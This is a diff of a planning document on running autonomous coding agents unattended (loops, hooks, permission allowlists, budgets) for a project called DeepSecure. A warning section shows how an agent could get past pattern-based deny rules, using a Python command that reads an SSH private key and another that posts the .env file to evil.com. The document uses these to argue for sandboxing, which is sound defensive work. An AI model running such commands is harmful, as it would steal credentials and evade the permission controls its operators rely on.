@@ -8,8 +8,8 @@
 ## Table of Contents
 
 - [Research Sources](#research-sources)
-- [Design Principles](#design-principles)
-- [Industry Consensus: 8 Pillars of AFK Development](#industry-consensus-8-pillars-of-afk-development)
+- [Design Principles](#design-principles) (13 principles)
+- [Industry Consensus: 8 Pillars of AFK Development](#industry-consensus-8-pillars-of-afk-development) (+ Pillar 9: Dynamic Workflows)
   - [1. Plan First, Execute Autonomously](#1-plan-first-execute-autonomously)
   - [2. Fresh Context Per Iteration (Ralph Wiggum Pattern)](#2-fresh-context-per-iteration-the-ralph-wiggum-pattern)
   - [3. Manual First, Automate Second](#3-manual-first-automate-second)
@@ -18,6 +18,7 @@
   - [6. Self-Healing (Verify, Fix, Retry)](#6-self-healing-verify-fix-retry)
   - [7. Notification When Stuck or Done](#7-notification-when-stuck-or-done)
   - [8. CLAUDE.md as Table of Contents](#8-claudemd-as-table-of-contents-not-encyclopedia)
+  - [9. Dynamic Workflows](#9-dynamic-workflows-claude-code-may-2026)
 - [DeepSecure on Shapiro's Five Levels](#where-deepsecure-sits-on-shapiros-five-levels)
 - [DeepSecure as AFK Security Infrastructure](#deepsecure-as-afk-security-infrastructure-dog-fooding)
 - [What DeepSecure Already Has](#what-deepsecure-already-has)
@@ -32,6 +33,9 @@
   - [Phase 5: CLAUDE.md Refactoring](#phase-5-claudemd-refactoring-openai-pattern)
   - [Phase 6: Parallel Orchestration](#phase-6-sandcastle-style-parallel-orchestration)
 - [Priority Ranking](#priority-ranking)
+- [Architectural Decision: Ralph Loop vs /run-batch](#architectural-decision-ralph-loop-vs-run-batch)
+- [Verified Claude Code API Surface](#verified-claude-code-api-surface-may-2026)
+- [Machine Sleep and Recovery Protocol](#machine-sleep-and-recovery-protocol)
 - [The Contrarian Views](#the-contrarian-views)
 - [Key Takeaways by Practitioner](#key-takeaways-by-practitioner)
 
@@ -61,6 +65,19 @@
 | 18 | Dark Software Factory | Deep Research Synthesis | Zero-trust AFK identity, fast-merge philosophy, sediment problem, skill engineering patterns | [Building AFK Workflows for DeepSecure](../chats/cursor_deepsecure_repository_afk_workfl.md) |
 | 19 | Hermes Agent | Nous Research | Persistent self-improving autonomous agent; meta-orchestrator delegating to Claude Code/Codex/OpenCode; 6 terminal backends, built-in cron, multi-platform messaging, self-improving skills | [github.com/nousresearch/hermes-agent](https://github.com/nousresearch/hermes-agent) |
 | 20 | Skill Quality Scoring | omriariav/omri-cc-stuff | Automated marketplace plugins scoring skills against multi-dimensional rubrics | [claudemarketplaces.com](https://claudemarketplaces.com/plugins/omriariav-omri-cc-stuff) |
+| 21 | Effective Harnesses for Long-Running Agents | Anthropic Engineering | JSON over Markdown for state, single-feature-per-session, browser automation for verification | [anthropic.com](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents) |
+| 22 | Running Claude Code Overnight | Eva Khmelinskaya | Phased sessions (30-60 min), `< /dev/null` for background, compaction rule dilution, `--max-budget-usd` | [medium.com](https://medium.com/@evekhm/running-claude-code-autonomously-overnight-what-breaks-and-how-to-fix-it-3bee3bd958b5) |
+| 23 | Claude Code Dynamic Workflows | Anthropic (May 28, 2026) | JavaScript orchestration scripts, 16 concurrent subagents, `/deep-research`, `/effort ultracode` | [agentpedia.codes](https://agentpedia.codes/blog/claude-opus-4-8-claude-code-workflows) |
+| 24 | Building Agents with Claude Agent SDK | Anthropic Engineering | Same tools/loop/context as Claude Code, programmable in Python/TypeScript, Managed Agents for production | [anthropic.com](https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk) |
+| 25 | How Boris Uses Claude Code | howborisusesclaudecode.com | 5 parallel worktrees, shell aliases, hundreds of agents, "surprisingly vanilla" setup, Opus 4.5 with thinking | [howborisusesclaudecode.com](https://howborisusesclaudecode.com/) |
+| 26 | 35 Claude Code Tips from Boris | Anup compilation | Verification loops 2-3x quality, end corrections with "update CLAUDE.md", 5 subagents for exploration | [anup.io](https://www.anup.io/35-claude-code-tips-from-the-guy-who-built-it/) |
+| 27 | Cursor Self-Hosted Cloud Agents | Cursor | Temporal-based orchestration, "one 9" to "two 9s" reliability, 50M+ actions/day, video demos | [cursor.com](https://cursor.com/blog/self-hosted-cloud-agents) |
+| 28 | How Ramp Built Inspect on Modal | Modal / Ramp | Pre-built snapshots every 30 min, instant start, 40-50% of PRs from agents, non-engineers shipping code | [modal.com](https://modal.com/blog/how-ramp-built-a-full-context-background-coding-agent-on-modal) |
+| 29 | Extreme Harness Engineering | Latent Space | OpenAI's 1B tokens/day, Symphony/Elixir orchestration, 1-minute build rule, ghost libraries, P0-P2 review | [latent.space](https://www.latent.space/p/harness-eng) |
+| 30 | Self-Improving Coding Agents | Addy Osmani | Anti-rationalization tables, compounding error math, scope creep as primary failure mode | [addyosmani.com](https://addyosmani.com/blog/self-improving-agents/) |
+| 31 | Sandcastle Framework | Matt Pocock | TypeScript library for parallel sandboxed agents, worktree + Docker isolation, branch strategies | [github.com/mattpocock/sandcastle](https://github.com/mattpocock/sandcastle) |
+| 32 | The Creator of OpenCode on AI Productivity | Codacy / Dax Raad | "The productivity feeling is real, the productivity isn't", one fast agent > many slow, wait for users | [blog.codacy.com](https://blog.codacy.com/the-creator-of-opencode-thinks-youre-fooling-yourself-about-ai-productivity) |
+| 33 | 2026 Agentic Coding Trends Report | Anthropic | Industry-wide adoption metrics, permission modes, hook patterns, enterprise deployment patterns | [resources.anthropic.com](https://resources.anthropic.com/hubfs/2026%20Agentic%20Coding%20Trends%20Report.pdf) |
 
 ---
 
@@ -195,6 +212,61 @@ At L4 and above, the human role shifts from "writes code" or "reviews diffs" to:
 
 The output of a capability architect is not code -- it's the **environment** in which agents produce code.
 
+### Principle 11: Compounding Error Math (Osmani + Anthropic)
+
+> "A 20-step process with 95% per-step reliability only succeeds 36% of the time."
+
+Tool calling fails 3-15% of the time in production. This is the fundamental constraint on long autonomous runs. The math is unforgiving:
+
+| Steps | 95% per-step | 90% per-step |
+|-------|-------------|-------------|
+| 5 | 77% | 59% |
+| 10 | 60% | 35% |
+| 20 | 36% | 12% |
+| 50 | 8% | 0.5% |
+
+**Implications for AFK:**
+- Prefer many short iterations (Ralph loop) over one long session
+- Each iteration should be 1 task, not 10 — the fewer steps, the higher the success probability
+- Self-healing (retry on failure) improves per-step reliability, but cannot overcome the exponential decay of chaining
+- OpenAI enforces a **one-minute maximum build loop** — if builds exceed this, agents halt and decompose the task. This forces smaller, more testable changes.
+
+### Principle 12: JSON Over Markdown for Agent State (Anthropic Research)
+
+> "Models are less likely to inappropriately modify structured JSON compared to Markdown, which they tend to rewrite or summarize."
+
+Anthropic's harness engineering research specifically recommends JSON for progress tracking. The problem with Markdown checklists (`- [ ] Task 1`):
+- Models may rewrite surrounding text while updating a checkbox
+- Markdown is ambiguous (indentation, nested lists, mixed formatting)
+- Harder for scripts to parse reliably
+
+The fix (from Carson's `prd.json`):
+```json
+{
+  "tasks": [
+    {"id": "WS-A1", "description": "Create auth endpoint", "passes": false, "blocked": null},
+    {"id": "WS-A2", "description": "Add JWT validation", "passes": false, "blocked": null},
+    {"id": "WS-B1", "description": "Gateway routing", "passes": true, "blocked": null}
+  ]
+}
+```
+
+Boolean `passes` makes completion detection trivial for scripts. `blocked` captures failure reason. JSON parse errors are immediately detectable (unlike malformed Markdown which silently degrades).
+
+### Principle 13: Environment Quality Over Model Quality (Cursor + Ramp)
+
+> "The single biggest factor in cloud agent output quality is ensuring it has a full development environment." — Cursor Engineering
+
+Cursor's migration from work-stealing to Temporal-based orchestration took them from "one 9" to "two 9s" of reliability. Ramp's Inspect agent uses Modal sandboxes with pre-built snapshots (Postgres, Redis, Temporal, RabbitMQ, VS Code server, Chromium) refreshed every 30 minutes — sessions start working in seconds.
+
+The lesson: upgrading the model from Sonnet to Opus matters less than ensuring the agent has:
+- A full development environment with all services running
+- Fast feedback loops (tests complete in under 60 seconds)
+- Pre-built snapshots so cold starts are fast
+- Sandboxed execution so the agent can't damage shared state
+
+**For DeepSecure:** Before investing in more sophisticated orchestration, ensure `docker compose up` is fast and reliable, test suites run quickly, and the Ralph prompt loads the right context.
+
 ---
 
 ## Industry Consensus: 8 Pillars of AFK Development
@@ -239,9 +311,28 @@ while true; do
     --output-format json \
     --prompt-file ralph-prompt.md \
     --allowedTools "Edit,Write,Bash(git:*),Bash(pytest:*)" \
-    --max-turns 50
+    --max-turns 50 \
+    --max-budget-usd 5.00 \
+    < /dev/null
 done
 ```
+
+**Critical flags for AFK/background execution:**
+- `< /dev/null`: **MANDATORY** for background processes. Without this, Claude hangs waiting for stdin when run via `nohup` or `&`, then exits silently. Eva Khmelinskaya documented this as the #1 overnight failure mode.
+- `--max-budget-usd N`: Per-session cost ceiling. Prevents runaway API costs during overnight AFK. Set to expected cost per task + 50% buffer.
+- `--dangerously-skip-permissions`: Full autonomy bypass. Boris Cherny explicitly does NOT use this — use `--allowedTools` instead.
+- `--permission-mode auto`: Classifier-gated alternative (safer than full skip). An Opus 4.5 classifier evaluates each permission request and auto-approves safe ones.
+
+**Completion detection — the sentinel pattern (snarktank/ralph):**
+The canonical Ralph implementation monitors output for a sentinel string and exits immediately:
+```bash
+OUTPUT=$(claude --print --prompt-file ralph-prompt.md < /dev/null 2>&1 | tee /dev/stderr) || true
+if echo "$OUTPUT" | grep -q "<promise>COMPLETE</promise>"; then
+  echo "All tasks complete!"
+  break
+fi
+```
+The agent is instructed to output `<promise>COMPLETE</promise>` when all tasks are done. This is faster than re-checking the progress file — the loop exits within seconds of completion instead of waiting for the next iteration.
 
 **Why fresh context matters — The Sediment Problem:** Long-running single sessions accumulate stale context, outdated file contents, and compaction artifacts — what the Dark Software Factory paper calls the **Sediment Problem**. After ~100k tokens, compacted context becomes increasingly unreliable: the agent may reference deleted files, use outdated API signatures, or repeat already-completed work. Each fresh Ralph iteration sees the codebase as it actually is right now because it starts clean.
 
@@ -361,7 +452,7 @@ AFK operation breaks down completely when the agent hits a permission prompt and
 | Approach | Who Uses It | How It Works |
 |----------|-------------|--------------|
 | `/permissions` allowlist | Boris Cherny | Pre-approve safe commands so they never prompt |
-| `PermissionRequest` hook to Slack | Boris Cherny | Route risky prompts to phone for approval while AFK |
+| `Notification` hook (permission_prompt matcher) to Slack | Boris Cherny | Route risky prompts to phone for approval while AFK |
 | Auto-approve via Opus 4.5 hook | Boris Cherny | Hook sends permission request to a model that scans for attacks and auto-approves safe ones |
 | Permission bubbling | Agent AFK (Piccolo) | Nested subagents forward permission requests up to parent/user |
 | `--permission-mode auto` | Claude Code headless flag | Auto-approve in headless/AFK scripts (use with allowlist) |
@@ -370,7 +461,7 @@ AFK operation breaks down completely when the agent hits a permission prompt and
 **Boris's philosophy:** "I don't use `--dangerously-skip-permissions`. Instead, use `/permissions` to pre-allow specific safe commands. Fewer interruptions while keeping guardrails."
 
 **The auto-approve pattern (advanced):**
-A `PermissionRequest` hook that sends the command to a fast model (Claude Haiku or Opus 4.5) which evaluates whether it's safe. If safe, auto-approve. If risky, forward to Slack for human review.
+A `Notification` hook (with `permission_prompt` matcher) that sends the command to a fast model (Claude Haiku or Opus 4.5) which evaluates whether it's safe. If safe, auto-approve. If risky, forward to Slack for human review.
 
 **The `/afk` toggle pattern (OpenCode's `opencode-afk` plugin):**
 A single command that flips the agent into AFK mode and back in <100ms. Instead of manually reconfiguring permissions each time you leave, `/afk` toggles a boolean state:
@@ -385,6 +476,17 @@ For DeepSecure, implement as a Claude Code command skill that writes to `.afk/st
 
 **AFK Security Profile (from Claude Code Cheatsheet):**
 A distinct permission profile that allows development tools but explicitly denies secrets access and network exfiltration. See [Phase 3.5](#phase-35-afk-permissions-and-hooks) for the full template.
+
+**CRITICAL WARNING: Deny-lists are bypassable (May 2026 review finding).**
+Pattern-based deny rules like `Bash(cat ~/.ssh/*)` provide **false security**. An agent can trivially bypass them:
+```bash
+# These bypass "Bash(cat ~/.ssh/*)" deny rule:
+python -c "print(open('/Users/imaxxs/.ssh/id_rsa').read())"
+Bash(python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com', data=open('.env').read().encode())")
+```
+Claude Code's permission matching is prefix-based on the command string, not semantic. `~` expansion happens in the shell, not in the permission matcher, so `Bash(cat ~/.ssh/*)` won't catch `Bash(cat /Users/imaxxs/.ssh/id_rsa)`.
+
+**Industry consensus (Ramp, Cursor, OpenAI): sandbox the environment, don't pattern-match commands.** For unsupervised AFK execution, the agent should run in a Docker container or VM where secrets are simply not mounted. The deny-list is a defense-in-depth layer, not a primary control. See [Phase 3.5](#phase-35-afk-permissions-and-hooks) for the recommended Docker sandbox approach.
 
 ---
 
@@ -440,7 +542,7 @@ The most advanced self-healing: the loop identifies a problem, studies the codeb
 **The Day Shift / Night Shift pattern:** A formal separation of human and agent operating modes:
 - **Day Shift (human):** Planning, architecture, spec writing, reviewing blocked items, updating CLAUDE.md/skills based on overnight learnings
 - **Night Shift (agent):** Autonomous execution of the Ralph loop, PR babysitting, CI fixing, doc gardening
-- The handoff artifact is the RALPH_PROGRESS.md file — humans update it during the day, agents consume and update it overnight
+- The handoff artifact is the `ralph_progress.json` file (JSON format, see Principle 12) — humans update it during the day, agents consume and update it overnight
 
 This maps to Shapiro's L4: "You write a spec. You argue with it about the spec. You craft skills... Then you leave for 12 hours."
 
@@ -498,6 +600,45 @@ OpenAI keeps their AGENTS.md to ~100 lines, pointing to structured docs/. Matt P
 
 The tension: CLAUDE.md should compound learnings, but it shouldn't grow unbounded. The solution is the OpenAI pattern -- keep the root file slim and pointer-rich, with detailed rules in referenced files that agents load on demand.
 
+**CRITICAL CAVEAT (May 2026 review finding):** Claude Code auto-loads `CLAUDE.md` at session start but does **NOT** auto-load referenced files. If you split CLAUDE.md and move critical rules (token types, backend conventions) to `docs/TOKEN_TYPES.md`, every fresh Ralph iteration starts WITHOUT those rules — unless:
+1. A `SessionStart` hook pre-loads critical reference files, OR
+2. The ralph-prompt explicitly instructs the agent to read them
+
+**Do NOT split CLAUDE.md until you have a verified loading mechanism.** The split without a loader is a regression from the monolithic CLAUDE.md that ensures rules are always loaded. See [Phase 5](#phase-5-claudemd-refactoring-openai-pattern) for the prerequisite.
+
+---
+
+### 9. Dynamic Workflows (Claude Code, May 2026)
+
+**NEW (May 28, 2026):** Claude Code now supports JavaScript orchestration scripts that the agent writes for your task, executed by a separate runtime in the background. This is a potential replacement for Phase 6's manual parallel orchestration.
+
+**How it works:**
+- Up to **16 concurrent subagents** per workflow, max 1,000 agents total per run
+- Subagents inherit your tool allowlist and run in `acceptEdits` mode
+- Triggered by including the word "workflow" in your prompt, or via `/deep-research`
+- `/effort ultracode` enables automatic workflow orchestration with xhigh reasoning
+- Intermediate state stored in script variables, isolated from conversation context
+- Saved workflows can be reused like slash commands via `/workflows` then pressing `s`
+- `alt+w` bypasses workflow routing if triggered accidentally
+
+**What this replaces:**
+| Phase 6 Script | Dynamic Workflow Equivalent |
+|----------------|----------------------------|
+| `parallel-build.sh` + worktrees | Single `workflow` prompt spawns N subagents |
+| `parallel-build-tmux.sh` | Built-in -- no tmux needed |
+| `merge-parallel.sh` | Subagents commit to branches, workflow merges |
+| Manual tmux session management | Automatic lifecycle management |
+
+**What this does NOT replace:**
+- The Ralph loop (fresh context per iteration) -- workflows run within a session
+- The planning pipeline (`/run-plan`, `/breakdown-design`) -- workflows are execution, not planning
+- Merge point verification -- workflows don't know about `execute_merge_point.sh`
+- Docker sandbox isolation -- workflows run in the host environment
+
+**Recommended approach:** Use Dynamic Workflows for intra-batch parallelism (multiple independent tasks within one batch), but keep the Ralph loop for inter-batch sequencing (fresh context between batches).
+
+---
+
 **Skill engineering discipline:** Skills are not throwaway markdown files — they are engineered artifacts with quality requirements:
 
 | Skill Engineering Practice | Why It Matters |
@@ -552,6 +693,20 @@ Dan Shapiro's framework maps organizations from "spicy autocomplete" (L0) to "da
 **L3 to L4 gap:** Automated orchestration + self-healing + notification. The planning infrastructure is there; the autonomous execution loop is not.
 
 **L5 aspiration (Huntley's Loom):** The loop identifies problems, studies the codebase, fixes them, deploys, and verifies -- automatically. Combined with OpenAI's agent-to-agent review where humans aren't required, this is the "dark factory" where specs go in and software comes out.
+
+**Industry benchmarks (May 2026):**
+
+| Company | L-Level | Key Metric | Source |
+|---------|---------|------------|--------|
+| OpenAI (internal) | L4-L5 | ~1M LOC, zero human-written, ~1,500 PRs, 5-10 PRs/engineer/day | [29] |
+| Ramp (Inspect) | L4 | 40-50% of all merged PRs from agents, non-engineers shipping code | [28] |
+| Cursor (internal) | L4 | 30-40% of PRs from cloud agents, 50M+ actions/day | [27] |
+| Ryan Carson | L4 | 15 simultaneous Devin threads, $2-3k/month | [16] |
+| Boris Cherny | L4 | 20-30 PRs/day normal, 150/day peak, hundreds of agents | [25] |
+| Dan Shapiro (self-assessed) | L4 | Writes specs, walks away for 12 hours | [6] |
+| **DeepSecure** | **L3** | Human present for each step invocation | Current |
+
+**The L4 threshold is no longer aspirational for the industry** — multiple teams are operating there daily. The gap for DeepSecure is infrastructure (Ralph loop, notifications, permission handling), not capability.
 
 ---
 
@@ -712,6 +867,19 @@ The repo has significant infrastructure for agent-assisted development:
 | 36 | No skill `gotchas.md` files | Agents rediscover domain pitfalls on every run | Skill engineering discipline |
 | 37 | No semantic deduplication | Agents may redo already-completed work | Pre-execution task matching |
 | 38 | No skill quality scoring | No way to measure or improve skill effectiveness | Marketplace plugin rubrics |
+| 39 | No `< /dev/null` in AFK scripts | Claude hangs waiting for stdin when run via nohup or & | Eva Khmelinskaya [22] |
+| 40 | No `--max-budget-usd` cost ceiling | Overnight AFK runs can incur unlimited API costs | Claude Code CLI |
+| 41 | No dirty-tree idempotency guard | Agent crash mid-task leaves dirty tree; next iteration reattempts on broken state | snarktank/ralph |
+| 42 | No machine sleep/reboot recovery | `caffeinate` not used; no protocol for recovering partial state after laptop sleep | All overnight AFK practitioners |
+| 43 | Ralph loop uses Markdown progress, not JSON | Models rewrite/summarize Markdown; JSON is more reliable for state tracking | Anthropic research [21], Carson [16] |
+| 44 | Deny-list provides false security | Pattern-based denials are trivially bypassed via Python; need Docker sandbox | Ramp, Cursor, OpenAI |
+| 45 | No sentinel completion detection | Loop checks progress file each iteration instead of immediate exit on `<promise>COMPLETE</promise>` | snarktank/ralph |
+| 46 | No Dynamic Workflows integration | Claude Code's May 2026 feature (16 concurrent subagents) not leveraged | Anthropic [23] |
+| 47 | No one-minute build rule | No constraint on build/test feedback loop duration | OpenAI Symphony [29] |
+| 48 | Ralph loop bypasses /run-batch | Two parallel execution paths that will drift; need architectural decision | Internal review |
+| 49 | Hook event names conflated | Doc uses PascalCase (`PostCompact`) but actual Claude Code uses `SessionStart` with `compact` matcher | Claude Code CLI verification |
+| 50 | No phased session architecture | No time-boxing of sessions (30-60 min phases per Eva Khmelinskaya) | [22] |
+| 51 | CLAUDE.md split breaks implicit loading | Referenced files not auto-loaded; need SessionStart hook as prerequisite | Internal review |
 
 ---
 
@@ -783,10 +951,10 @@ for status_file in docs/workstreams/*/STATUS.md; do
   fi
 done
 
-# Check Ralph progress if active
-for progress_file in docs/workstreams/*/RALPH_PROGRESS.md; do
+# Check Ralph progress if active (JSON format)
+for progress_file in docs/workstreams/*/ralph_progress.json; do
   if [ -f "$progress_file" ]; then
-    REMAINING=$(grep -c "^- \[ \]" "$progress_file" 2>/dev/null || echo 0)
+    REMAINING=$(python3 -c "import json; d=json.load(open('$progress_file')); print(sum(1 for t in d['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null || echo 0)
     if [ "$REMAINING" -gt 0 ]; then
       echo "NOTICE: $REMAINING Ralph tasks remaining. Don't stop yet."
     fi
@@ -817,23 +985,29 @@ Auto-format Python files after every edit, eliminating CI formatting failures (B
 
 **Effort:** 1 hour | **Impact:** Medium -- eliminates a class of CI failures
 
-#### 1d. PostCompact Context Recovery Hook
+#### 1d. Context Recovery via SessionStart Hook (Compact Matcher)
+
+**IMPORTANT (May 2026 API verification):** Claude Code does NOT have separate `PostCompact` or `PreCompact` hook events. Instead, the `SessionStart` hook fires with a `source` field that can be `"startup"`, `"resume"`, `"clear"`, or `"compact"`. Use the `"compact"` matcher on `SessionStart` to re-inject context after compaction.
 
 Re-inject critical context after Claude compresses its context window. This prevents "amnesia" during long AFK sessions:
 
 ```json
 {
   "hooks": {
-    "PostCompact": [
+    "SessionStart": [
       {
-        "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
+        "matcher": "compact",
+        "hooks": [{
+          "type": "command",
+          "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
+        }]
       }
     ]
   }
 }
 ```
 
-Create `.claude/compact-recovery.md` with the absolute minimum critical rules:
+Whatever this command writes to stdout gets added to Claude's context after compaction. Create `.claude/compact-recovery.md` with the absolute minimum critical rules:
 - Token type usage (User Token vs Agent JWT vs Internal Token)
 - File path conventions (`app/` prefix for backend services)
 - Test organization rules
@@ -842,25 +1016,53 @@ Create `.claude/compact-recovery.md` with the absolute minimum critical rules:
 
 **Effort:** 1 hour | **Impact:** Medium -- prevents context loss in long sessions
 
-#### 1e. SessionStart Hook
+#### 1e. SessionStart Hook (Startup Matcher)
 
-Load recent context at the beginning of every session (Boris's pattern):
+Load recent context at the beginning of every new session (Boris's pattern):
 
 ```json
 {
   "hooks": {
     "SessionStart": [
       {
-        "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
+        "matcher": "startup",
+        "hooks": [{
+          "type": "command",
+          "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
+        }]
       }
     ]
   }
 }
 ```
 
-The `SessionStart` hook has a `source` field: `"startup"`, `"resume"`, `"clear"`, or `"compact"`. Use this to vary behavior (e.g., load more context on startup, less on resume).
+The `source` matchers: `"startup"` (new session), `"resume"` (continued session), `"clear"` (context cleared), `"compact"` (context compacted). Use different matchers for different behaviors — load more context on startup, re-inject critical rules on compact.
 
 **Effort:** 30 minutes | **Impact:** Medium -- agents start with situational awareness
+
+#### 1f. Notification Hook (Permission Prompts)
+
+**IMPORTANT (May 2026 API verification):** Claude Code does NOT have a `PermissionRequest` hook event. Instead, the `Notification` hook fires with matchers including `"permission_prompt"`. Use this to get notified when the agent is blocked waiting for permission:
+
+```json
+{
+  "hooks": {
+    "Notification": [
+      {
+        "matcher": "permission_prompt",
+        "hooks": [{
+          "type": "command",
+          "command": "osascript -e 'display notification \"Claude Code needs permission\" with title \"Claude Code\" sound name \"Glass\"' 2>/dev/null || true"
+        }]
+      }
+    ]
+  }
+}
+```
+
+This replaces the incorrect `PermissionRequest` hook event documented in earlier versions of this document.
+
+**Effort:** 15 minutes | **Impact:** High -- know immediately when agent is blocked during AFK
 
 ---
 
@@ -941,30 +1143,62 @@ Per Huntley's "manual first" principle, start with a single-iteration script bef
 set -euo pipefail
 
 WORKSTREAM=${1:?"Usage: afk-once.sh <workstream-name>"}
-PROGRESS_FILE="docs/workstreams/$WORKSTREAM/RALPH_PROGRESS.md"
+PROGRESS_FILE="docs/workstreams/$WORKSTREAM/ralph_progress.json"
 PROMPT_FILE="docs/workstreams/$WORKSTREAM/ralph-prompt.md"
+MAX_BUDGET=${RALPH_MAX_BUDGET:-5.00}
 
+# --- Prerequisite checks ---
 if [ ! -f "$PROGRESS_FILE" ]; then
   echo "ERROR: $PROGRESS_FILE not found."
+  echo "Create it with the JSON progress template (see Step 2d)."
   exit 1
 fi
 
-REMAINING=$(grep -c "^- \[ \]" "$PROGRESS_FILE" 2>/dev/null || echo 0)
+if [ ! -f "$PROMPT_FILE" ]; then
+  echo "ERROR: $PROMPT_FILE not found."
+  exit 1
+fi
+
+# --- Dirty-tree idempotency guard (GAP #41 fix) ---
+DIRTY=$(git status --short 2>/dev/null | head -5)
+if [ -n "$DIRTY" ]; then
+  echo "WARNING: Working tree is dirty. A previous iteration may have crashed mid-task."
+  echo "$DIRTY"
+  echo ""
+  echo "Options:"
+  echo "  1. Review and commit: git add -A && git commit -m 'WIP: partial task from crashed iteration'"
+  echo "  2. Discard changes:   git checkout -- . && git clean -fd"
+  echo "  3. Stash and continue: git stash"
+  echo ""
+  read -p "Stash and continue? [y/N] " -n 1 -r
+  echo ""
+  if [[ $REPLY =~ ^[Yy]$ ]]; then
+    git stash push -m "afk-once: dirty tree stash $(date +%Y%m%d_%H%M%S)"
+    echo "Stashed. Continuing..."
+  else
+    echo "Aborting. Clean the tree manually before retrying."
+    exit 1
+  fi
+fi
+
+REMAINING=$(python3 -c "import json; tasks=json.load(open('$PROGRESS_FILE')); print(sum(1 for t in tasks['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null || echo 0)
 echo "Tasks remaining: $REMAINING"
+echo "Max budget: \$$MAX_BUDGET"
 echo "Running single iteration..."
 echo ""
 
 claude --print \
   --output-format json \
   --prompt-file "$PROMPT_FILE" \
-  --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(mypy:*),Bash(black:*),Bash(isort:*),Bash(find:*),Bash(grep:*),Bash(ls:*),Bash(cat:*)" \
+  --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(python3:*),Bash(mypy:*),Bash(black:*),Bash(isort:*),Bash(find:*),Bash(grep:*),Bash(ls:*),Bash(cat:*),Bash(docker:*),Bash(docker compose:*)" \
   --max-turns 80 \
-  --append-system-prompt "Read $PROGRESS_FILE. Find the FIRST unchecked task (line starting with '- [ ]'). Implement it fully. Run tests to verify. If tests pass, git add and commit. Then update $PROGRESS_FILE: change '- [ ]' to '- [x]' for the completed task. If tests fail after 3 attempts, add '(BLOCKED: <reason>)' to the task line."
+  --max-budget-usd "$MAX_BUDGET" \
+  --append-system-prompt "Read $PROGRESS_FILE (JSON format). Find the FIRST task where passes=false and blocked=null. Implement it fully. Run tests to verify. If tests pass, git add and commit. Then update $PROGRESS_FILE: set passes=true for the completed task. If tests fail after 3 attempts, set blocked='<reason>' for that task. When ALL tasks have passes=true, output the sentinel: <promise>COMPLETE</promise>"
 
 echo ""
 echo "=== Iteration complete ==="
 echo "Review the changes: git log -1 --stat"
-echo "Check progress: cat $PROGRESS_FILE"
+echo "Check progress: python3 -c \"import json; d=json.load(open('$PROGRESS_FILE')); print(f'Done: {sum(1 for t in d[\\\"tasks\\\"] if t[\\\"passes\\\"])} / {len(d[\\\"tasks\\\"])}')\""
 echo ""
 echo "Satisfied? Run again, or graduate to: ./scripts/ralph.sh $WORKSTREAM"
 ```
@@ -980,7 +1214,7 @@ Only use this after you've done 5-10 successful `afk-once.sh` runs:
 #
 # Prerequisites:
 #   - Workstream must exist in docs/workstreams/<name>/
-#   - RALPH_PROGRESS.md must exist with task checklist
+#   - ralph_progress.json must exist with task list (JSON format)
 #   - Tests must be runnable via `make test` or `pytest`
 #   - You have done 5+ successful afk-once.sh runs first
 
@@ -988,14 +1222,15 @@ set -euo pipefail
 
 WORKSTREAM=${1:?"Usage: ralph.sh <workstream-name> [max-iterations]"}
 MAX_ITERATIONS=${2:-10}
-PROGRESS_FILE="docs/workstreams/$WORKSTREAM/RALPH_PROGRESS.md"
+PROGRESS_FILE="docs/workstreams/$WORKSTREAM/ralph_progress.json"
 PROMPT_FILE="docs/workstreams/$WORKSTREAM/ralph-prompt.md"
 LOG_DIR="docs/workstreams/$WORKSTREAM/ralph-logs"
 LEARNINGS_FILE=".afk/learnings.md"
+MAX_BUDGET=${RALPH_MAX_BUDGET:-5.00}
 
 # Validate prerequisites
 if [ ! -f "$PROGRESS_FILE" ]; then
-  echo "ERROR: $PROGRESS_FILE not found. Create it with a task checklist first."
+  echo "ERROR: $PROGRESS_FILE not found. Create it with the JSON progress template (see Step 2d)."
   exit 1
 fi
 
@@ -1004,14 +1239,28 @@ if [ ! -f "$PROMPT_FILE" ]; then
   exit 1
 fi
 
+# Validate JSON is parseable
+if ! python3 -c "import json; json.load(open('$PROGRESS_FILE'))" 2>/dev/null; then
+  echo "ERROR: $PROGRESS_FILE is not valid JSON."
+  exit 1
+fi
+
 mkdir -p "$LOG_DIR"
 mkdir -p "$(dirname "$LEARNINGS_FILE")"
 touch "$LEARNINGS_FILE"
 
+# --- Prevent machine sleep (macOS) (GAP #42 fix) ---
+if command -v caffeinate &>/dev/null; then
+  caffeinate -i -w $$ &
+  CAFFEINATE_PID=$!
+  echo "Sleep prevention: caffeinate started (PID: $CAFFEINATE_PID)"
+fi
+
 echo "=== Ralph Wiggum Loop ==="
 echo "Workstream: $WORKSTREAM"
 echo "Max iterations: $MAX_ITERATIONS"
-echo "Progress file: $PROGRESS_FILE"
+echo "Progress file: $PROGRESS_FILE (JSON)"
+echo "Max budget per iteration: \$$MAX_BUDGET"
 echo "Learnings: $LEARNINGS_FILE"
 echo "Started: $(date)"
 echo ""
@@ -1024,27 +1273,43 @@ for i in $(seq 1 $MAX_ITERATIONS); do
 
   echo "--- Iteration $i/$MAX_ITERATIONS ($(date)) ---"
 
-  # Check if all tasks complete before starting
-  if ! grep -q "^- \[ \]" "$PROGRESS_FILE" 2>/dev/null; then
+  # Check if all tasks complete before starting (JSON query)
+  REMAINING=$(python3 -c "import json; tasks=json.load(open('$PROGRESS_FILE')); print(sum(1 for t in tasks['tasks'] if not t['passes'] and not t.get('blocked')))" 2>/dev/null || echo 0)
+  if [ "$REMAINING" -eq 0 ]; then
     echo "All tasks complete! Stopping."
     scripts/notify.sh "Ralph [$WORKSTREAM]" "ALL TASKS COMPLETE! Run finished." "urgent" 2>/dev/null || \
